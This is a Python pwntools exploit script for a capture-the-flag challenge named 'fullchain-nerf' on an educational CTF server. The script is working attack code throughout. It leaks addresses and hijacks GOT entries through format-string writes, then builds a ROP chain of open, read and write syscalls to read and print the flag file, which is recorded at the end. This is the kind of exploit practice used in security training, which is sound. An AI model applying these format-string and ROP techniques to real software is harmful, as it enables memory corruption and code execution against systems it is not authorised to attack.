from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#r = process("./fullchain-nerf")
r = remote("edu-ctf.zoolab.org", 30206)

def connect(pos, act, length=0x60, payload=None):
    r.recvuntil('> ')
    r.sendline(pos)
    r.recvuntil('> ')
    r.sendline(act)
    if payload:
        r.recvuntil('> ')
        r.sendline(str(length))
        try:
            padding = 'A' * (length - len(payload))
            payload += padding
        except:
            padding = b'A' * (length - len(payload))
            payload += padding
        
        r.send(payload)


# leak local address to calculate cnt address in order to modify the value of cnt
connect("local", "write%7$lx")
s = r.recvuntilS('global')
local_addr = int(s[5:-6], 16)
cnt_addr = local_addr + 0x24

# write cnt address into stack
offset = 16
payload = b'A'*offset + p64(cnt_addr)
connect("local", "read", len(payload), payload)
# modify cnt value to 205
# contents in local = 10,11,12th parameters of printf
# cnt address is at 12th (which is written in the last phase)
# cnt = 205
connect("local", "write%200c%12$n")



# leak __libc_csu_init address to calculate printf@got.plt address and binary base address
connect("local", "write%6$lx")
s = r.recvuntilS('global')
__libc_csu_init_addr = int(s[5:-6], 16)
printf_got_plt_addr = __libc_csu_init_addr + 0x29d0
bin_base_addr = __libc_csu_init_addr - 0x1670
# write printf@got.plt address into stack
payload = b'A'*offset + p64(printf_got_plt_addr)
connect("local", "read", len(payload), payload)
# read printf_got_plt_addr and get the value of printf's address
# calculate libc base address by printf address - printf offset
connect("local", "write%12$s")
s = r.recvuntil('global')
printf_addr = s[5:-6]
padding = 8 - len(printf_addr)
printf_addr += b'\x00'*padding
printf_addr = u64(printf_addr)
printf_offset = elf.symbols['printf']
libc_base_addr = printf_addr - printf_offset



# leak global address
payload = b"%7$lx"
connect("global", "read", len(payload), payload)
connect("global", "write")
s = r.recvuntilS('global')
global_addr = int(s[:-6], 16)



# ROP chain (return to csu)
"""
.text:00000000000016B0                 mov     rdx, r14
.text:00000000000016B3                 mov     rsi, r13
.text:00000000000016B6                 mov     edi, r12d
.text:00000000000016B9                 call    qword ptr [r15+rbx*8]
.text:00000000000016BD                 add     rbx, 1
.text:00000000000016C1                 cmp     rbp, rbx
.text:00000000000016C4                 jnz     short loc_16B0
.text:00000000000016C6
.text:00000000000016C6 loc_16C6:                               ; CODE XREF: __libc_csu_init+35↑j
.text:00000000000016C6                 add     rsp, 8
.text:00000000000016CA                 pop     rbx
.text:00000000000016CB                 pop     rbp
.text:00000000000016CC                 pop     r12 (edi)
.text:00000000000016CE                 pop     r13 (rsi)
.text:00000000000016D0                 pop     r14 (rdx)
.text:00000000000016D2                 pop     r15 (target function pointer)
.text:00000000000016D4                 retn
"""
# pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
pop6_ret = bin_base_addr + 0x16CA
# mov rdx, r14; mov rsi, r13; mov edi, r12d, call [r15+rbx*8]
csu = bin_base_addr + 0x16B0
# open
# This returns open64
#open_addr = libc_base_addr + elf.symbols['open']
# readelf -sa libc.so.6 | grep open
open_addr = libc_base_addr + 0x110e50
# read
read_addr = libc_base_addr + elf.symbols['read']
# write
#write_addr = libc_base_addr + elf.symbols['write']
write_addr = libc_base_addr + 0x1111d0

print(hex(open_addr), hex(read_addr), hex(write_addr))
# GOT hijack to deal with function pointer
# We need to choose those function that will not be executed anymore, in case of accidentally calling them
# Except for read since it's already in the GOT
read_got_addr = bin_base_addr + 0x4050
# hijack exit as open
exit_got_addr = bin_base_addr + 0x4068
payload = b'A'*offset + p64(exit_got_addr)
connect("local", "read", len(payload), payload)
overwrite = int(hex(open_addr)[-4:],16)
payload = "%" + str(overwrite) + "c%12$hn"
connect("global", "read", len(payload), payload)
connect("global", "write")

payload = b'A'*offset + p64(exit_got_addr+2)
connect("local", "read", len(payload), payload)
overwrite = int(hex(open_addr)[-8:-4],16)
payload = "%" + str(overwrite) + "c%12$hn"
connect("global", "read", len(payload), payload)
connect("global", "write")

payload = b'A'*offset + p64(exit_got_addr+4)
connect("local", "read", len(payload), payload)
overwrite = int(hex(open_addr)[-12:-8],16)
payload = "%" + str(overwrite) + "c%12$hn"
connect("global", "read", len(payload), payload)
connect("global", "write")
# hijack seccomp_init as write
seccomp_init_got_addr = bin_base_addr + 0x4018
payload = b'A'*offset + p64(seccomp_init_got_addr)
connect("local", "read", len(payload), payload)
overwrite = int(hex(write_addr)[-4:],16)
payload = "%" + str(overwrite) + "c%12$hn"
connect("global", "read", len(payload), payload)
connect("global", "write")

payload = b'A'*offset + p64(seccomp_init_got_addr+2)
connect("local", "read", len(payload), payload)
overwrite = int(hex(write_addr)[-8:-4],16)
payload = "%" + str(overwrite) + "c%12$hn"
connect("global", "read", len(payload), payload)
connect("global", "write")

payload = b'A'*offset + p64(seccomp_init_got_addr+4)
connect("local", "read", len(payload), payload)
overwrite = int(hex(write_addr)[-12:-8],16)
payload = "%" + str(overwrite) + "c%12$hn"
connect("global", "read", len(payload), payload)
connect("global", "write")


# There is another issue in the first argument of open
# $rdi = global_addr but the csu gadget will use mov edi, r12d
# The first four bytes will be cleand out
# And only the last four bytes are modified
# Need other rop gadgets pop rsi; pop rdi; ret
pop_rdi_ret = bin_base_addr + 0x16d3
pop_rsi_r15_ret = bin_base_addr + 0x16d1
call_exit = bin_base_addr + 0x1527
pop_rax_ret = libc_base_addr + 0x4a550
pop_rcx_ret = libc_base_addr + 0x9f822
syscall_ret = libc_base_addr + 0x66229
pop_rdx_rbx_ret = libc_base_addr + 0x162866

# ROP = [
#     pop6_ret, 0, 1, global_addr, 0, 0, exit_got_addr,
#     pop_rdi_ret, global_addr,
#     pop_rsi_r15_ret, 0, exit_got_addr,
#     pop_rax_ret, 2,
#     pop_rcx_ret, 0,
#     syscall_ret,
#     #csu + 0x9, # start from call [r15+rbx*8]
#     #pop6_ret, 0, 1, global_addr, 0, 0, exit_got_addr,
#     pop6_ret, 0, 1, 3, global_addr, 0x30, read_got_addr,
#     csu, 0, 1, 1, global_addr, 0x30, seccomp_init_got_addr
# ]

# I give up using csu gadget
# It turns out that all the gadgets I need is in the libc
ROP = [
    pop_rdi_ret, global_addr,
    pop_rsi_r15_ret, 0, 0,
    pop_rax_ret, 2,
    syscall_ret,

    pop_rdi_ret, 3,
    pop_rsi_r15_ret, global_addr, 0,
    pop_rdx_rbx_ret , 0x30, 0x0,
    pop_rax_ret, 0,
    syscall_ret,

    pop_rdi_ret, 1,
    pop_rax_ret, 1,
    syscall_ret
]


# write rop chain to address start from local_addr + 56 == return address
payload = b'A'*56
for i,rop_addr in enumerate(ROP):
    if i < (0x60-56)//8:
        payload += p64(rop_addr)
    elif i == (0x60-56)//8:
        # send previous payload which can be overwritten by easy overflow
        connect("local", "read", len(payload), payload)
        
        # the space for overflow is not enough for all rop
        # use fmt to write the rest
        rop = p64(rop_addr)
        for j in range(0, len(rop), 2):
            payload = b'A'*offset + p64(local_addr + 56 + i*8 + j)
            connect("local", "read", len(payload), payload)
            overwrite = (rop[j+1]<<8) + rop[j]
            if overwrite != 0:
                payload = "%" + str(overwrite) + "c%12$hn"
            else:
                payload = "%65536c%12$hn"
            connect("global", "read", len(payload), payload)
            connect("global", "write")
    else:
        rop = p64(rop_addr)
        for j in range(0, 8, 2):
            payload = b'A'*offset + p64(local_addr + 56 + i*8 + j)
            connect("local", "read", len(payload), payload)
            overwrite = (rop[j+1]<<8) + rop[j]
            if overwrite != 0:
                payload = "%" + str(overwrite) + "c%12$hn"
            else:
                payload = "%65536c%12$hn"
            connect("global", "read", len(payload), payload)
            connect("global", "write")

# set cnt to 1 for the last step
payload = b'A'*offset + p64(cnt_addr)
connect("local", "read", len(payload), payload)
payload = "%1c%12$n"
connect("global", "read", len(payload), payload)
connect("global", "write")

# write /home/fullchain-nerf/flag to global
payload = b'/home/fullchain-nerf/flag\x00'
connect("global", "read", len(payload), payload)


#gdb.attach(r)
print(r.recv())

r.interactive()
#FLAG{fullchain_so_e4sy}